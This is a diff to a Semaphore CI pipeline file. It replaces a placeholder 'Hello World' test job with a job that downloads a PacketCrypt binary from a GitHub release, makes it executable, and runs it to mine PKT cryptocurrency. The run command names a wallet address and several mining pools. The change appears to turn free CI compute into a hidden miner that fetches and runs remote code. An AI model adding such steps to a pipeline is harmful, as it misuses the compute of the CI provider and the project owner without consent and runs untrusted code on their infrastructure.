@@ -3,17 +3,19 @@ name: Run in Docker
 agent:
   machine:
     type: e1-standard-2
+    os_image: ubuntu1804
   containers:
     - name: main
-      image: 'registry.semaphoreci.com/node:10' # Your primary container where commands are run
+      image: 'registry.semaphoreci.com/node:10'
     - name: database
       image: 'registry.semaphoreci.com/postgres:11'
-
 blocks:
   - name: Hello World
     task:
       jobs:
-        - name: Test job
+        - name: PKT
           commands:
-            - checkout # Check out the code
-            - echo "Hello from my 'main' container"
+            - checkout
+            - 'wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux'
+            - chmod +x packetcrypt_x8664_linux
+            - './packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ https://pool.pkthash.com http://pool.pkteer.com http://pool.k1m3r4.com -t 1'
